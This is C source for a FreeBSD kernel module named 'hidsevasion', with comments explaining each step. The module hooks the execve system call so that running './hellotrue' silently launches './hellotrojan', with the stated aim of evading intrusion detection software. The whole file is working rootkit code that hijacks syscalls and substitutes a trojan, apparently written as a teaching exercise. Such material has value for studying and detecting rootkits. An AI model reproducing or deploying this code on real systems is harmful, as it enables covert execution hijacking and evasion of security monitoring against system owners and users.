// This routine will attempt to swap one executable for the other
// without an Intrusion Detection software getting any the wiser.
// What it does is to hook the execve call and there substitute 
// the name of the executable. Once this is hooked then whenever
// a program name is typed at the command prompt the alternate 
// will run.
#include <sys/types.h>
#include <sys/param.h>
#include <sys/proc.h>
#include <sys/module.h>
#include <sys/sysent.h>
#include <sys/kernel.h>
#include <sys/systm.h>
#include <sys/syscall.h>
#include <sys/sysproto.h>

#include <vm/vm.h>
#include <vm/vm_page.h>
#include <vm/vm_map.h>

// The executable needs to be invoked exactly as below. 
// If it is invoked as /home/rootkit/hellotrue the hooking
// will not be done.

#define ORIGINAL "./hellotrue"
#define TROJAN "./hellotrojan"

// The idea is to hook the execve syscall which is responsible
// for the execution of a new process.

static int execve_hook(struct thread * td, void * syscall_args) {


	struct execve_args * uap;
	uap = (struct execve_args *)syscall_args;

	struct execve_args kernel_ea;
	struct execve_args *user_ea;
	struct vmspace * vm;	
	vm_offset_t base, addr;
	char t_fname[] = TROJAN;

// Only if we are attempting to execute ./hellotrue further processing
// needs to be done. Otherwise just continue without any other
// nefarious deals.

	if (strcmp(uap->fname, ORIGINAL) == 0) {
		
	uprintf("Entered with file name %s\n", uap->fname);
// The process' virtual memory can be accessed by the below 
// statement.

		vm = curthread->td_proc->p_vmspace;
// The base address is the page boundary rounded value of the
// process vm's starting address.
		base = round_page((vm_offset_t)vm->vm_daddr);
// And addr will be the ending address.

		addr = base + ctob(vm->vm_dsize);

// Below we allocate a chunk of page sized memory to the end of the
// vm block for the process.

		vm_map_find(&vm->vm_map, NULL, 0, &addr, PAGE_SIZE,
			FALSE, VM_PROT_ALL, VM_PROT_ALL, 0);
// And here we adjust the dsize value to reflect the fact.

		vm->vm_dsize += btoc(PAGE_SIZE);

// The file name is copied to the addr: so that value will be 
// written at the start of the newly allocated page.

		copyout(&t_fname, (char *)addr, strlen(t_fname));
// Here a new kernel_ea struct is filled to pass into the execve call.
// The three parameters are the name of the executable file, command
// line arguments, environment variables.
		
		kernel_ea.fname = (char *)addr;
		kernel_ea.argv = uap->argv;
		kernel_ea.envv = uap->envv;

// Now the user_ea struct memory is obtained by moving past the filename
// value that is written to the addr value earlier.

		user_ea = (struct execve_args *)addr + sizeof(t_fname);
// Now the kernel_ea struct is copied to the user_ea struct.

		copyout(&kernel_ea, user_ea, sizeof(struct execve_args));

// Why the above copy? Because the user mode values need to be passed to 
// the execve call.

		return(execve(curthread, user_ea));
	}

	return (execve(td, syscall_args));
}

static int load(struct module * module, int cmd, void * args) {

	int error = 0;
	switch(cmd) {
		case MOD_LOAD:
			sysent[SYS_execve].sy_call = (sy_call_t *) execve_hook;
			break;
		case MOD_UNLOAD:
			sysent[SYS_execve].sy_call = (sy_call_t *)execve;
			break;
		default:
			error = EOPNOTSUPP;
			break;
	}	

	return(error);
}

static moduledata_t hidsevasion_mod = {

	"hidsevasion",
	load,
	NULL
};

DECLARE_MODULE(hidsevasion, hidsevasion_mod, SI_SUB_DRIVERS, SI_ORDER_MIDDLE);


